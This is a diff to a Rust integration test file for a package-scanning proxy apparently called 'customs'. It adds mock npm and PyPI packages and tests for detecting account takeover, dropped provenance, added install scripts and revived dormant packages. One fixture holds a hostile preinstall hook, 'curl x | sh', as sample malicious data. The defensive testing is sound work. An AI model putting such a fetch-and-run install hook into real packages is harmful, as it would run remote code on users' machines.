@@ -13,7 +13,7 @@ use axum::response::{IntoResponse, Response};
 use axum::routing::get;
 use axum::{Json, Router};
 use chrono::Utc;
-use customs::config::{Mode, Policy};
+use customs::config::{Mode, Policy, RuleSeverity};
 use customs::engine::{Engine, EngineConfig, Limits, ScanFn};
 use customs::metrics::Metrics;
 use customs_model::Models;
@@ -55,8 +55,16 @@ fn pypi_packages() -> Vec<(&'static str, &'static str, &'static [u8], String)> {
         ("goodpkg", "1.1.0", b"benign archive v1.1", old.clone()),
         ("evilpkg", "0.0.1", b"EVIL archive", old.clone()),
         ("reqeusts", "2.0.0", b"benign typosquat", old.clone()),
-        ("slowpkg", "1.0.0", b"benign slow", old),
+        ("slowpkg", "1.0.0", b"benign slow", old.clone()),
         ("newpkg", "1.0.0", b"benign but new", fresh),
+        // A release after five quiet years.
+        (
+            "revived",
+            "1.0.0",
+            b"benign revived",
+            "2015-01-01T00:00:00.000000Z".into(),
+        ),
+        ("revived", "1.1.0", b"benign revived again", old),
     ]
 }
 
@@ -145,10 +153,11 @@ async fn files(State(m): State<Mock>, Path(path): Path<String>) -> Response {
     StatusCode::NOT_FOUND.into_response()
 }
 
-/// npm packages: (name, version, bytes, published, scripts).
+/// npm packages: (name, version, bytes, published, extra version document fields).
 fn npm_packages() -> Vec<(&'static str, &'static str, &'static [u8], String, Value)> {
     let old = "2019-05-01T00:00:00.000Z".to_string();
     let fresh = (Utc::now() - chrono::Duration::hours(1)).to_rfc3339();
+    let attested = json!({"attestations": {"url": "https://r/attestations/x", "provenance": {}}});
     vec![
         (
             "@scope/lib",
@@ -162,21 +171,43 @@ fn npm_packages() -> Vec<(&'static str, &'static str, &'static [u8], String, Val
             "0.1.0",
             b"benign plain",
             old.clone(),
-            json!({"test": "jest"}),
+            json!({"scripts": {"test": "jest"}}),
         ),
         (
             "freshpkg",
             "1.0.0",
             b"benign fresh",
             fresh,
-            json!({"postinstall": "node setup.js"}),
+            json!({"scripts": {"postinstall": "node setup.js"}}),
         ),
         (
             "evil-js",
             "6.6.6",
             b"EVIL js",
+            old.clone(),
+            json!({"scripts": {"preinstall": "curl x | sh"}}),
+        ),
+        // An established package whose latest release looks like an account takeover.
+        (
+            "hijacked",
+            "1.0.0",
+            b"benign hijacked",
             old,
-            json!({"preinstall": "curl x | sh"}),
+            json!({"_npmUser": {"name": "maintainer"}, "dist": attested}),
+        ),
+        (
+            "hijacked",
+            "1.1.0",
+            b"benign hijacked 1.1.0",
+            "2019-06-01T00:00:00.000Z".into(),
+            json!({"_npmUser": {"name": "maintainer"}, "dist": attested}),
+        ),
+        (
+            "hijacked",
+            "1.1.1",
+            b"benign hijacked 1.1.1",
+            "2024-01-01T00:00:00.000Z".into(),
+            json!({"_npmUser": {"name": "attacker"}, "scripts": {"postinstall": "node bundle.js"}}),
         ),
     ]
 }
@@ -193,18 +224,31 @@ async fn npm_doc(State(m): State<Mock>, Path(rest): Path<String>) -> Response {
         return StatusCode::NOT_FOUND.into_response();
     }
     let name = rest.replace("%2f", "/").replace("%2F", "/");
-    let Some((n, v, _, t, scripts)) = npm_packages().into_iter().find(|p| p.0 == name) else {
+    let rows: Vec<_> = npm_packages().into_iter().filter(|p| p.0 == name).collect();
+    if rows.is_empty() {
         return (StatusCode::NOT_FOUND, Json(json!({"error": "Not found"}))).into_response();
-    };
-    let bare = n.rsplit('/').next().unwrap();
+    }
+    let mut time = serde_json::Map::new();
+    let mut versions = serde_json::Map::new();
+    for (n, v, _, t, extra) in &rows {
+        let bare = n.rsplit('/').next().unwrap();
+        let mut doc = extra.clone();
+        doc["name"] = json!(n);
+        doc["version"] = json!(v);
+        if doc.get("dist").is_none() {
+            doc["dist"] = json!({});
+        }
+        doc["dist"]["tarball"] = json!(format!("{}/npm/{n}/-/{bare}-{v}.tgz", m.base));
+        doc["dist"]["shasum"] = json!("x");
+        time.insert(v.to_string(), json!(t));
+        versions.insert(v.to_string(), doc);
+    }
+    time.insert("created".into(), json!(rows[0].3));
     Json(json!({
-        "name": n,
-        "dist-tags": {"latest": v},
-        "time": {v: t, "created": t},
-        "versions": {v: {
-            "name": n, "version": v, "scripts": scripts,
-            "dist": {"tarball": format!("{}/npm/{n}/-/{bare}-{v}.tgz", m.base), "shasum": "x"}
-        }}
+        "name": name,
+        "dist-tags": {"latest": rows.last().unwrap().1},
+        "time": time,
+        "versions": versions,
     }))
     .into_response()
 }
@@ -585,6 +629,98 @@ async fn warn_only_age_rule_with_install_scripts() {
     h.stop().await;
 }
 
+fn rules_of(v: &Value) -> Vec<String> {
+    v["policy_hits"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|h| h.as_str_rule().to_string())
+        .collect()
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn release_history_rules() {
+    let h = Harness::start(|_| {}).await;
+    // `check` and the proxy both compare the release with the ones before it.
+    let (s, v) = h.check("npm", "hijacked", None).await;
+    assert_eq!(s, 200);
+    assert_eq!(v["version"], "1.1.1");
+    assert_eq!(
+        rules_of(&v),
+        vec![
+            "provenance_dropped",
+            "install_script_added",
+            "dormant_revival",
+            "publisher_changed"
+        ]
+    );
+    assert_eq!(v["decision"], "warn");
+    assert!(v["policy_hits"][1]["detail"]
+        .as_str()
+        .unwrap()
+        .contains("postinstall added since 1.1.0: node bundle.js"));
+
+    // Warnings: the proxy serves the tarball and records the same hits.
+    let r = h.get("/npm/hijacked/-/hijacked-1.1.1.tgz").await;
+    assert_eq!(r.status(), 200);
+    let ev = h.events().await;
+    assert_eq!(ev[0]["kind"], "install");
+    let id = ev[0]["verdict_id"].as_i64().unwrap();
+    let verdict: Value = h
+        .get(&format!("/api/verdicts/{id}"))
+        .await
+        .json()
+        .await
+        .unwrap();
+    assert!(rules_of(&verdict).contains(&"publisher_changed".to_string()));
+    let (_, v) = h.check("npm", "hijacked", Some("1.1.0")).await;
+    assert!(rules_of(&v).is_empty(), "{v}");
+
+    // PyPI through the proxy: the project document provides the history.
+    let r = h.get(&pypi_file_path("revived", "1.1.0")).await;
+    assert_eq!(r.status(), 200);
+    let id = h.events().await[0]["verdict_id"].as_i64().unwrap();
+    let verdict: Value = h
+        .get(&format!("/api/verdicts/{id}"))
+        .await
+        .json()
+        .await
+        .unwrap();
+    assert_eq!(rules_of(&verdict), vec!["dormant_revival"]);
+    h.stop().await;
+
+    // Severities are configurable, and `off` keeps a rule quiet.
+    let h = Harness::start(|p| {
+        p.provenance_dropped = RuleSeverity::Block;
+        p.publisher_changed = RuleSeverity::Off;
+        p.dormant_revival = RuleSeverity::Off;
+    })
+    .await;
+    let r = h.get("/npm/hijacked/-/hijacked-1.1.1.tgz").await;
+    assert_eq!(r.status(), 403);
+    let err: Value = r.json().await.unwrap();
+    assert!(err["error"]
+        .as_str()
+        .unwrap()
+        .contains("provenance_dropped"));
+    let (_, v) = h.check("npm", "hijacked", None).await;
+    assert_eq!(
+        rules_of(&v),
+        vec!["provenance_dropped", "install_script_added"]
+    );
+    let r = h.get(&pypi_file_path("revived", "1.1.0")).await;
+    assert_eq!(r.status(), 200);
+    let id = h.events().await[0]["verdict_id"].as_i64().unwrap();
+    let verdict: Value = h
+        .get(&format!("/api/verdicts/{id}"))
+        .await
+        .json()
+        .await
+        .unwrap();
+    assert!(rules_of(&verdict).is_empty(), "{verdict}");
+    h.stop().await;
+}
+
 trait RuleName {
     fn as_str_rule(&self) -> &str;
 }
@@ -721,8 +857,13 @@ async fn policy_api_validates_and_persists() {
     let mut p: Value = h.get("/api/policy").await.json().await.unwrap();
     assert_eq!(p["mode"], "enforce");
     assert_eq!(p["warn_threshold"], "model");
+    assert_eq!(p["provenance_dropped"], "warn");
+    assert_eq!(p["version_anomaly"], "off");
+    assert_eq!(p["dormant_days"], 365);
     p["deny"] = json!(["pypi:goodpkg"]);
     p["block_threshold"] = json!(0.8);
+    p["publisher_changed"] = json!("block");
+    p["dormant_days"] = json!(400);
     let r = h
         .http
         .put(format!("{}/api/policy", h.base))
@@ -734,8 +875,23 @@ async fn policy_api_validates_and_persists() {
     let saved = std::fs::read_to_string(h.engine.policy_path()).unwrap();
     assert!(saved.contains("block_threshold = 0.8"), "{saved}");
     assert!(saved.contains("\"pypi:goodpkg\""), "{saved}");
+    assert!(saved.contains("publisher_changed = \"block\""), "{saved}");
+    assert!(saved.contains("dormant_days = 400"), "{saved}");
     let r = h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
     assert_eq!(r.status(), 403);
+
+    let mut bad = p.clone();
+    bad["dormant_days"] = json!(0);
+    let r = h
+        .http
+        .put(format!("{}/api/policy", h.base))
+        .json(&bad)
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(r.status(), 400);
+    let e: Value = r.json().await.unwrap();
+    assert_eq!(e["errors"][0]["field"], "dormant_days");
 
     p["warn_threshold"] = json!(1.5);
     let r = h
